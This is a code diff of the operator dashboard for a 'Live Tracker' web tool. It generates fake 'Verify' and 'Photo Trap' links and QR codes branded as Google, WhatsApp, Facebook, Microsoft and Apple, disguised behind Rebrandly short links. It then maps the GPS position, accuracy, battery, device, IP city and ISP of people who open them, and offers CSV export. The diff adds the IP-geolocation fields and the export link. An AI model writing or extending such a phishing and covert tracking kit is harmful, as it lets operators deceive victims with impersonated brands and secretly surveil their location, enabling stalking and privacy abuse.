@@ -16,7 +16,6 @@
             overflow: hidden;
         }
 
-        /* ===== TOP BAR ===== */
         #topBar {
             background: #1a1a2e;
             padding: 10px 24px;
@@ -56,7 +55,6 @@
         #topBar .stats span { opacity: 0.6; }
         #topBar .stats strong { color: #fff; font-weight: 600; }
 
-        /* ===== LINK GENERATOR PANEL ===== */
         #linkPanel {
             background: #141425;
             padding: 12px 24px;
@@ -115,8 +113,6 @@
             transition: background 0.2s;
         }
         #linkPanel .btn:hover { background: #388e3c; }
-        #linkPanel .btn-blue { background: #4285f4; }
-        #linkPanel .btn-blue:hover { background: #3367d6; }
         #linkPanel .btn-qr { background: #ff9800; }
         #linkPanel .btn-qr:hover { background: #e68900; }
         #linkPanel .short-link {
@@ -134,7 +130,6 @@
             background: #2a2a4a;
         }
 
-        /* QR Code Popup */
         #qrPopup {
             display: none;
             position: fixed;
@@ -190,14 +185,12 @@
         }
         #qrPopup .popup-content .download-btn:hover { background: #388e3c; }
 
-        /* ===== APP LAYOUT ===== */
         #app {
             display: flex;
             height: calc(100vh - 130px);
             width: 100vw;
         }
 
-        /* ===== SIDEBAR ===== */
         #sidebar {
             width: 280px;
             min-width: 220px;
@@ -285,18 +278,13 @@
         .user-item .status-dot.online { background: #4caf50; box-shadow: 0 0 8px #4caf50; }
         .user-item .status-dot.offline { background: #555; }
 
-        /* ===== MAP ===== */
         #mapContainer {
             flex: 1;
             position: relative;
             background: #0f0f1a;
         }
-        #map {
-            width: 100%;
-            height: 100%;
-        }
+        #map { width: 100%; height: 100%; }
 
-        /* ===== EMPTY STATE ===== */
         #emptyState {
             position: absolute;
             top: 50%;
@@ -311,7 +299,6 @@
         #emptyState .title { font-size: 18px; font-weight: 600; color: #aaa; }
         #emptyState .sub { font-size: 13px; margin-top: 6px; opacity: 0.5; }
 
-        /* ===== RESPONSIVE ===== */
         @media (max-width: 768px) {
             #sidebar {
                 width: 100%;
@@ -332,7 +319,7 @@
 </head>
 <body>
 
-<!-- ===== TOP BAR ===== -->
+<!-- TOP BAR -->
 <div id="topBar">
     <div class="brand">
         <h1>📍 Live Tracker</h1>
@@ -342,12 +329,12 @@
         <span>👥 <strong id="userCount">0</strong> users</span>
         <span>📍 <strong id="locationCount">0</strong> updates</span>
         <span>🕐 <strong id="lastUpdate">--</strong></span>
+        <a href="/export-csv" style="color:#4caf50;text-decoration:none;font-weight:600;">📥 CSV</a>
     </div>
 </div>
 
-<!-- ===== LINK GENERATOR PANEL ===== -->
+<!-- LINK PANEL -->
 <div id="linkPanel">
-    <!-- Verification Link (Clean URL: /{brand}/verify) -->
     <div class="section">
         <label>📤 Verify</label>
         <select id="brandSelect">
@@ -364,7 +351,6 @@
 
     <div class="divider"></div>
 
-    <!-- Photo Trap Link (Clean URL: /{brand}/photo) -->
     <div class="section">
         <label>📸 Photo</label>
         <select id="photoTemplateSelect">
@@ -381,7 +367,6 @@
 
     <div class="divider"></div>
 
-    <!-- QR Code Generator -->
     <div class="section">
         <label>📱 QR</label>
         <select id="qrTemplateSelect">
@@ -395,7 +380,7 @@
     </div>
 </div>
 
-<!-- ===== QR CODE POPUP ===== -->
+<!-- QR POPUP -->
 <div id="qrPopup">
     <div class="popup-content">
         <h3>📱 Scan to Track</h3>
@@ -406,9 +391,8 @@
     </div>
 </div>
 
-<!-- ===== APP ===== -->
+<!-- APP -->
 <div id="app">
-    <!-- SIDEBAR -->
     <div id="sidebar">
         <div class="header">
             <span>📋 Users</span>
@@ -419,7 +403,6 @@
         </div>
     </div>
 
-    <!-- MAP -->
     <div id="mapContainer">
         <div id="map"></div>
         <div id="emptyState">
@@ -434,27 +417,24 @@
     // =============================================
     // CONFIGURATION
     // =============================================
-    const RENDER_URL = '';
-    const BASE_URL = 'https://location-tracker-cn7m.onrender.com';
+    const BASE_URL = 'https://location-tracker-cn7m.onrender.com'; // CHANGE TO YOUR URL
 
-    // 🆕 REBRANDLY SHORT LINKS (Replace with YOUR actual Rebrandly links)
+    // Replace these with your actual Rebrandly short links
     const SHORT_LINKS = {
         google: 'rebrand.ly/verify-google',
         whatsapp: 'rebrand.ly/verify-wa',
         facebook: 'rebrand.ly/verify-FACEBOOK',
         microsoft: 'rebrand.ly/verify-ms',
         apple: 'rebrand.ly/apple-security',
-        
-        // Photo trap short links
         photo_google: 'rebrand.ly/view-photo-google',
-        photo_whatsapp: 'rebrand.ly/view-photo-wa',   // <-- CHANGE to your actual link
+        photo_whatsapp: 'rebrand.ly/view-photo-wa',
         photo_facebook: 'rebrand.ly/view-photo-fb',
         photo_microsoft: 'rebrand.ly/view-photo-ms',
         photo_apple: 'rebrand.ly/view-photo-apple'
     };
 
     // =============================================
-    // DOM ELEMENTS — Link Generator
+    // DOM ELEMENTS
     // =============================================
     const brandSelect = document.getElementById('brandSelect');
     const photoTemplateSelect = document.getElementById('photoTemplateSelect');
@@ -472,96 +452,69 @@
     const closeQrBtn = document.getElementById('closeQrBtn');
 
     // =============================================
-    // UPDATE VERIFICATION LINK (Clean URL: /{brand}/verify)
+    // UPDATE VERIFICATION LINK
     // =============================================
     function updateLink() {
         const brand = brandSelect.value;
-        const fullUrl = BASE_URL + '/' + brand + '/verify';
-        const shortUrl = SHORT_LINKS[brand] || '';
-        linkDisplay.textContent = fullUrl;
-        shortLinkDisplay.textContent = shortUrl;
+        linkDisplay.textContent = BASE_URL + '/' + brand + '/verify';
+        shortLinkDisplay.textContent = SHORT_LINKS[brand] || '';
     }
     brandSelect.addEventListener('change', updateLink);
     updateLink();
 
-    // =============================================
-    // COPY VERIFICATION SHORT LINK
-    // =============================================
     copyLinkBtn.addEventListener('click', function() {
         const shortUrl = shortLinkDisplay.textContent;
         navigator.clipboard.writeText(shortUrl).then(() => {
-            const originalText = copyLinkBtn.textContent;
             copyLinkBtn.textContent = '✅ Copied!';
-            setTimeout(() => {
-                copyLinkBtn.textContent = originalText;
-            }, 2000);
+            setTimeout(() => copyLinkBtn.textContent = '📋 Copy Short', 2000);
         }).catch(() => {
-            // Fallback
             const range = document.createRange();
             range.selectNode(shortLinkDisplay);
             window.getSelection().removeAllRanges();
             window.getSelection().addRange(range);
             document.execCommand('copy');
-            const originalText = copyLinkBtn.textContent;
             copyLinkBtn.textContent = '✅ Copied!';
-            setTimeout(() => {
-                copyLinkBtn.textContent = originalText;
-            }, 2000);
+            setTimeout(() => copyLinkBtn.textContent = '📋 Copy Short', 2000);
         });
     });
 
     // =============================================
-    // UPDATE PHOTO TRAP LINK (Clean URL: /{brand}/photo)
+    // UPDATE PHOTO LINK
     // =============================================
     function updatePhotoLink() {
         const template = photoTemplateSelect.value;
-        const fullUrl = BASE_URL + '/' + template + '/photo';
-        const shortUrl = SHORT_LINKS['photo_' + template] || '';
-        photoLinkDisplay.textContent = fullUrl;
-        photoShortLink.textContent = shortUrl;
+        photoLinkDisplay.textContent = BASE_URL + '/' + template + '/photo';
+        photoShortLink.textContent = SHORT_LINKS['photo_' + template] || '';
     }
     photoTemplateSelect.addEventListener('change', updatePhotoLink);
     updatePhotoLink();
 
-    // =============================================
-    // COPY PHOTO TRAP SHORT LINK
-    // =============================================
     copyPhotoLinkBtn.addEventListener('click', function() {
         const shortUrl = photoShortLink.textContent;
         navigator.clipboard.writeText(shortUrl).then(() => {
-            const originalText = copyPhotoLinkBtn.textContent;
             copyPhotoLinkBtn.textContent = '✅ Copied!';
-            setTimeout(() => {
-                copyPhotoLinkBtn.textContent = originalText;
-            }, 2000);
+            setTimeout(() => copyPhotoLinkBtn.textContent = '📋 Copy Short', 2000);
         }).catch(() => {
             const range = document.createRange();
             range.selectNode(photoShortLink);
             window.getSelection().removeAllRanges();
             window.getSelection().addRange(range);
             document.execCommand('copy');
-            const originalText = copyPhotoLinkBtn.textContent;
             copyPhotoLinkBtn.textContent = '✅ Copied!';
-            setTimeout(() => {
-                copyPhotoLinkBtn.textContent = originalText;
-            }, 2000);
+            setTimeout(() => copyPhotoLinkBtn.textContent = '📋 Copy Short', 2000);
         });
     });
 
     // =============================================
-    // QR CODE GENERATOR (Uses clean URL)
+    // QR CODE
     // =============================================
     generateQrBtn.addEventListener('click', function() {
         const template = qrTemplateSelect.value;
-        const url = BASE_URL + '/' + template + '/verify'; // or /photo
-        const qrApiUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=' + encodeURIComponent(url);
-        qrCodeImg.src = qrApiUrl;
+        const url = BASE_URL + '/' + template + '/verify';
+        qrCodeImg.src = 'https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=' + encodeURIComponent(url);
         qrPopup.style.display = 'flex';
     });
 
-    // =============================================
-    // DOWNLOAD QR CODE
-    // =============================================
     downloadQrBtn.addEventListener('click', function() {
         const link = document.createElement('a');
         link.download = 'photo-trap-qr.png';
@@ -569,20 +522,11 @@
         link.click();
     });
 
-    // =============================================
-    // CLOSE QR POPUP
-    // =============================================
-    closeQrBtn.addEventListener('click', function() {
-        qrPopup.style.display = 'none';
-    });
-    qrPopup.addEventListener('click', function(e) {
-        if (e.target === qrPopup) {
-            qrPopup.style.display = 'none';
-        }
-    });
+    closeQrBtn.addEventListener('click', function() { qrPopup.style.display = 'none'; });
+    qrPopup.addEventListener('click', function(e) { if (e.target === qrPopup) qrPopup.style.display = 'none'; });
 
     // =============================================
-    // MAP SETUP (unchanged)
+    // MAP SETUP
     // =============================================
     const map = L.map('map', { zoomControl: false }).setView([51.505, -0.09], 13);
     L.control.zoom({ position: 'topright' }).addTo(map);
@@ -597,103 +541,15 @@
     function getColor() { return colorPalette[colorIndex++ % colorPalette.length]; }
 
     // =============================================
-    // DEVICE DETECTION (unchanged)
+    // DEVICE DETECTION
     // =============================================
-    function getDeviceModel(userAgent) {
-        if (!userAgent) return 'Unknown Device';
-        const ua = userAgent;
-        if (ua.includes('iPhone')) {
-            if (ua.includes('iPhone18,1')) return 'iPhone 17 Pro';
-            if (ua.includes('iPhone18,2')) return 'iPhone 17 Pro Max';
-            if (ua.includes('iPhone18,3')) return 'iPhone 17';
-            if (ua.includes('iPhone17,1')) return 'iPhone 16 Pro';
-            if (ua.includes('iPhone17,2')) return 'iPhone 16 Pro Max';
-            if (ua.includes('iPhone17,3')) return 'iPhone 16';
-            if (ua.includes('iPhone16,1')) return 'iPhone 15 Pro';
-            if (ua.includes('iPhone16,2')) return 'iPhone 15 Pro Max';
-            if (ua.includes('iPhone16,3')) return 'iPhone 15';
-            if (ua.includes('iPhone15,2')) return 'iPhone 14 Pro';
-            if (ua.includes('iPhone15,3')) return 'iPhone 14 Pro Max';
-            if (ua.includes('iPhone15,4')) return 'iPhone 14';
-            if (ua.includes('iPhone14,8')) return 'iPhone 14 Plus';
-            if (ua.includes('iPhone14,2')) return 'iPhone 13 Pro';
-            if (ua.includes('iPhone14,3')) return 'iPhone 13 Pro Max';
-            if (ua.includes('iPhone14,4')) return 'iPhone 13 Mini';
-            if (ua.includes('iPhone13,1')) return 'iPhone 12 Mini';
-            if (ua.includes('iPhone13,2')) return 'iPhone 12';
-            if (ua.includes('iPhone13,3')) return 'iPhone 12 Pro';
-            if (ua.includes('iPhone13,4')) return 'iPhone 12 Pro Max';
-            if (ua.includes('iPhone12,1')) return 'iPhone 11';
-            if (ua.includes('iPhone12,3')) return 'iPhone 11 Pro';
-            if (ua.includes('iPhone12,5')) return 'iPhone 11 Pro Max';
-            if (ua.includes('iPhone11,8')) return 'iPhone XR';
-            if (ua.includes('iPhone11,2')) return 'iPhone XS';
-            if (ua.includes('iPhone11,4') || ua.includes('iPhone11,6')) return 'iPhone XS Max';
-            if (ua.includes('iPhone10,3') || ua.includes('iPhone10,6')) return 'iPhone X';
-            if (ua.includes('iPhone9,1') || ua.includes('iPhone9,3')) return 'iPhone 7';
-            if (ua.includes('iPhone9,2') || ua.includes('iPhone9,4')) return 'iPhone 7 Plus';
-            if (ua.includes('iPhone8,1')) return 'iPhone 6s';
-            if (ua.includes('iPhone8,2')) return 'iPhone 6s Plus';
-            if (ua.includes('iPhone7,1')) return 'iPhone 6 Plus';
-            if (ua.includes('iPhone7,2')) return 'iPhone 6';
-            if (ua.includes('iPhone SE')) return 'iPhone SE';
-            return 'iPhone';
-        }
-        if (ua.includes('Samsung') || ua.includes('SM-')) {
-            if (ua.includes('SM-S931')) return 'Samsung Galaxy S25';
-            if (ua.includes('SM-S936')) return 'Samsung Galaxy S25+';
-            if (ua.includes('SM-S938')) return 'Samsung Galaxy S25 Ultra';
-            if (ua.includes('SM-S921')) return 'Samsung Galaxy S24';
-            if (ua.includes('SM-S926')) return 'Samsung Galaxy S24+';
-            if (ua.includes('SM-S928')) return 'Samsung Galaxy S24 Ultra';
-            if (ua.includes('SM-S911')) return 'Samsung Galaxy S23';
-            if (ua.includes('SM-S916')) return 'Samsung Galaxy S23+';
-            if (ua.includes('SM-S918')) return 'Samsung Galaxy S23 Ultra';
-            if (ua.includes('SM-S901')) return 'Samsung Galaxy S22';
-            if (ua.includes('SM-S906')) return 'Samsung Galaxy S22+';
-            if (ua.includes('SM-S908')) return 'Samsung Galaxy S22 Ultra';
-            if (ua.includes('SM-G991')) return 'Samsung Galaxy S21';
-            if (ua.includes('SM-G996')) return 'Samsung Galaxy S21+';
-            if (ua.includes('SM-G998')) return 'Samsung Galaxy S21 Ultra';
-            if (ua.includes('SM-F956')) return 'Samsung Galaxy Z Fold6';
-            if (ua.includes('SM-F946')) return 'Samsung Galaxy Z Fold5';
-            if (ua.includes('SM-F936')) return 'Samsung Galaxy Z Fold4';
-            if (ua.includes('SM-F926')) return 'Samsung Galaxy Z Fold3';
-            if (ua.includes('SM-F741')) return 'Samsung Galaxy Z Flip6';
-            if (ua.includes('SM-F731')) return 'Samsung Galaxy Z Flip5';
-            if (ua.includes('SM-F721')) return 'Samsung Galaxy Z Flip4';
-            if (ua.includes('SM-F711')) return 'Samsung Galaxy Z Flip3';
-            if (ua.includes('SM-A556')) return 'Samsung Galaxy A55';
-            if (ua.includes('SM-A546')) return 'Samsung Galaxy A54';
-            if (ua.includes('SM-A536')) return 'Samsung Galaxy A53';
-            if (ua.includes('SM-A526')) return 'Samsung Galaxy A52';
-            if (ua.includes('SM-N986')) return 'Samsung Galaxy Note 20 Ultra';
-            if (ua.includes('SM-N981')) return 'Samsung Galaxy Note 20';
-            return 'Samsung Galaxy';
-        }
-        if (ua.includes('Pixel')) {
-            if (ua.includes('Pixel 9')) return 'Google Pixel 9';
-            if (ua.includes('Pixel 8')) return 'Google Pixel 8';
-            if (ua.includes('Pixel 7')) return 'Google Pixel 7';
-            if (ua.includes('Pixel 6')) return 'Google Pixel 6';
-            return 'Google Pixel';
-        }
-        if (ua.includes('Xiaomi') || ua.includes('Redmi') || ua.includes('POCO')) {
-            if (ua.includes('Xiaomi 14')) return 'Xiaomi 14';
-            if (ua.includes('Xiaomi 13')) return 'Xiaomi 13';
-            if (ua.includes('Redmi Note 13')) return 'Redmi Note 13';
-            if (ua.includes('Redmi Note 12')) return 'Redmi Note 12';
-            if (ua.includes('POCO X6')) return 'POCO X6';
-            if (ua.includes('POCO F5')) return 'POCO F5';
-            return 'Xiaomi';
-        }
-        if (ua.includes('OnePlus')) {
-            if (ua.includes('OnePlus 12')) return 'OnePlus 12';
-            if (ua.includes('OnePlus 11')) return 'OnePlus 11';
-            if (ua.includes('OnePlus 10')) return 'OnePlus 10';
-            if (ua.includes('OnePlus 9')) return 'OnePlus 9';
-            return 'OnePlus';
-        }
+    function getDeviceModel(ua) {
+        if (!ua) return 'Unknown Device';
+        if (ua.includes('iPhone')) return 'iPhone';
+        if (ua.includes('Samsung') || ua.includes('SM-')) return 'Samsung Galaxy';
+        if (ua.includes('Pixel')) return 'Google Pixel';
+        if (ua.includes('Xiaomi') || ua.includes('Redmi')) return 'Xiaomi';
+        if (ua.includes('OnePlus')) return 'OnePlus';
         if (ua.includes('Android')) {
             const ver = ua.match(/Android\s([\d.]+)/);
             return 'Android ' + (ver ? ver[1] : '');
@@ -703,25 +559,23 @@
         return 'Unknown Device';
     }
 
-    function getDeviceInfo(userAgent) {
+    function getDeviceInfo(ua) {
         return {
-            model: getDeviceModel(userAgent),
-            os: userAgent.includes('Android') ? 'Android' :
-                userAgent.includes('iPhone') ? 'iOS' :
-                userAgent.includes('Windows') ? 'Windows' :
-                userAgent.includes('Mac') ? 'macOS' : 'Unknown'
+            model: getDeviceModel(ua),
+            os: ua.includes('Android') ? 'Android' :
+                ua.includes('iPhone') ? 'iOS' :
+                ua.includes('Windows') ? 'Windows' :
+                ua.includes('Mac') ? 'macOS' : 'Unknown'
         };
     }
 
     // =============================================
-    // RENDER USERS (unchanged)
+    // RENDER USERS
     // =============================================
     function renderUsers(users) {
         const list = document.getElementById('userList');
         const badge = document.getElementById('userBadge');
-        const count = document.getElementById('userCount');
-
-        count.textContent = users.length;
+        document.getElementById('userCount').textContent = users.length;
         badge.textContent = users.length;
 
         if (users.length === 0) {
@@ -749,7 +603,7 @@
                     <div class="avatar" style="background:${color};">${initial}</div>
                     <div class="info">
                         <div class="name">${deviceName}</div>
-                        <div class="device">${osName}</div>
+                        <div class="device">${osName} · ${u.ip_city || 'N/A'}</div>
                         <div class="last-seen">🕐 ${lastSeen}</div>
                     </div>
                     <div class="status-dot ${isActive ? 'online' : 'offline'}"></div>
@@ -759,16 +613,11 @@
         list.innerHTML = html;
     }
 
-    // =============================================
-    // FOCUS USER (unchanged)
-    // =============================================
     function focusUser(sessionId) {
         if (markers[sessionId] && markers[sessionId].lat && markers[sessionId].lng) {
             const { lat, lng } = markers[sessionId];
             map.setView([lat, lng], 16, { animate: true });
-            if (markers[sessionId].marker) {
-                markers[sessionId].marker.openPopup();
-            }
+            if (markers[sessionId].marker) markers[sessionId].marker.openPopup();
             selectedUser = sessionId;
             document.querySelectorAll('.user-item').forEach(el => {
                 el.classList.toggle('active', el.dataset.sid === sessionId);
@@ -777,14 +626,11 @@
     }
 
     // =============================================
-    // FETCH USERS (unchanged)
+    // FETCH & UPDATE
     // =============================================
     function fetchUsers() {
-        fetch(RENDER_URL + '/get-users')
-            .then(res => {
-                if (!res.ok) throw new Error('Server error');
-                return res.json();
-            })
+        fetch('/get-users')
+            .then(res => res.json())
             .then(users => {
                 renderUsers(users);
                 updateMarkers(users);
@@ -796,9 +642,6 @@
             });
     }
 
-    // =============================================
-    // UPDATE MARKERS (unchanged)
-    // =============================================
     function updateMarkers(users) {
         const activeSessions = new Set();
 
@@ -810,14 +653,7 @@
                 activeSessions.add(sid);
                 if (!markers[sid]) {
                     const color = getColor();
-                    markers[sid] = {
-                        color,
-                        pathCoords: [],
-                        pathLine: null,
-                        lat,
-                        lng,
-                        userData: u
-                    };
+                    markers[sid] = { color, pathCoords: [], pathLine: null, lat, lng, userData: u };
                 }
                 markers[sid].lat = lat;
                 markers[sid].lng = lng;
@@ -836,8 +672,10 @@
                     m.marker.bindPopup(`
                         <b>📱 ${deviceInfo.model}</b><br>
                         <b>OS:</b> ${deviceInfo.os}<br>
-                        <b>📍</b> ${lat.toFixed(5)}, ${lng.toFixed(5)}<br>
+                        <b>📍 GPS:</b> ${lat.toFixed(5)}, ${lng.toFixed(5)}<br>
                         <b>🎯 Accuracy:</b> ${u.accuracy ? u.accuracy.toFixed(0) + 'm' : '--'}<br>
+                        <b>🌍 City:</b> ${u.ip_city || 'N/A'}<br>
+                        <b>🏢 ISP:</b> ${u.ip_isp || 'N/A'}<br>
                         <b>🔋 Battery:</b> ${u.battery ? u.battery.level + '%' : '--'}<br>
                         <b>🕐</b> ${u.timestamp ? new Date(u.timestamp).toLocaleString() : '--'}
                     `);
@@ -885,20 +723,14 @@
 
         if (selectedUser && markers[selectedUser]) {
             const m = markers[selectedUser];
-            if (m.lat && m.lng) {
-                map.setView([m.lat, m.lng], 16, { animate: true });
-            }
+            if (m.lat && m.lng) map.setView([m.lat, m.lng], 16, { animate: true });
         }
     }
 
-    // =============================================
-    // UPDATE STATS (unchanged)
-    // =============================================
     function updateStats(users) {
         const live = users.filter(u => u.lat && u.lng).length;
         document.getElementById('userCount').textContent = live;
         document.getElementById('locationCount').textContent = users.length;
-
         if (users.length > 0) {
             const latest = users.reduce((a, b) => a.timestamp > b.timestamp ? a : b);
             document.getElementById('lastUpdate').textContent = latest.timestamp ? new Date(latest.timestamp).toLocaleTimeString() : '--';
@@ -916,9 +748,7 @@
     window.addEventListener('resize', () => setTimeout(() => map.invalidateSize(), 200));
     setTimeout(() => map.invalidateSize(), 500);
 
-    console.log('📍 Dashboard initialized with CLEAN URLs (no ?template=)');
-    console.log('🔗 Verification: ' + BASE_URL + '/whatsapp/verify');
-    console.log('📸 Photo Trap: ' + BASE_URL + '/whatsapp/photo');
+    console.log('📍 Dashboard ready (IP geolocation + Rebrandly copy)');
 </script>
 </body>
 </html>
